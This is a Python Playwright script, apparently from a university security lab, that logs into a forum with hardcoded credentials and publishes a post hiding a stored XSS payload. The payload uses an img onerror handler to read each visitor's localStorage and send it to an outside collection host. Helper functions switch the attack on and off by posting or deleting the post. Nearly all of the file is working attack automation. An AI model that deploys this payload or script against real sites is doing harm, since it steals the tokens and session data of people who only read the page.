import threading

from playwright.sync_api import sync_playwright

# Configuration
DEFAULT_WEB_URL = "https://elec0138-forum.0138019.xyz/"
DEFAULT_USERNAME = "tr1"
DEFAULT_PASSWORD = "12345678"

ATTACK_PAYLOAD_IDENTIFIER = "counted 812.13 stars."
ATTACK_PAYLOAD = \
    f"I looked up at the sky tonight and {ATTACK_PAYLOAD_IDENTIFIER}" + \
    """<img src="x" onerror="const d={dt:'elec0138-xss',ls:JSON.stringify(localStorage)};new Image().src='https://elec0138-fc.meeska.me/collect?'+new URLSearchParams(d)">"""


def login_page(page, username: str, password: str):
    page.goto(DEFAULT_WEB_URL)
    page.fill("#username", username)
    page.fill("#password", password)
    page.click("button:has-text('Sign In')")
    page.wait_for_url("**/forum")
    return True


def logout_and_close(page, browser):
    try:
        page.click("button:has-text('Logout')")
        page.wait_for_url("**/")
        return True
    except Exception as e:
        _ = e
        return False
    finally:
        browser.close()


def enable_attack(page):
    page.wait_for_selector(".loading-container", state="hidden")

    content = page.content()
    if ATTACK_PAYLOAD_IDENTIFIER in content:
        return False

    page.fill("textarea#content", ATTACK_PAYLOAD)
    page.click("button:has-text('Publish Post')")
    page.wait_for_selector(f"text={ATTACK_PAYLOAD_IDENTIFIER}")
    return True


def disable_attack(page):
    page.wait_for_selector(".loading-container", state="hidden")

    content = page.content()
    if ATTACK_PAYLOAD_IDENTIFIER not in content:
        return False

    posts = page.query_selector_all(".thread-card")
    for post in posts:
        html = post.inner_html()
        if ATTACK_PAYLOAD_IDENTIFIER in html:
            try:
                delete_btn = post.query_selector(".delete-button")
                if not delete_btn:
                    continue
                delete_btn.click()
                page.wait_for_timeout(1000)
                return True
            except Exception:
                return False
    return False


def run_attack_operation(operation="disable"):
    result = {"success": False, "message": "Operation not performed"}

    def run_in_thread():
        nonlocal result
        try:
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True)
                context = browser.new_context()
                page = context.new_page()

                login_success = login_page(page, DEFAULT_USERNAME, DEFAULT_PASSWORD)
                if not login_success:
                    result = {"success": False, "message": "Failed to login"}
                    return

                if operation == "enable":
                    success = enable_attack(page)
                    result = {
                        "success": success,
                        "message": "Attack enabled successfully" if success else "Attack was already enabled"
                    }
                else:
                    success = disable_attack(page)
                    result = {
                        "success": success,
                        "message": "Attack posts deleted successfully" if success else "No attack posts found to delete"
                    }

                logout_and_close(page, browser)
        except Exception as e:
            result = {"success": False, "message": f"Error: {str(e)}"}

    thread = threading.Thread(target=run_in_thread)
    thread.start()
    thread.join(timeout=30)  # Wait for a maximum of 30 seconds

    if thread.is_alive():
        return {"success": False, "message": "Operation timed out"}

    return result
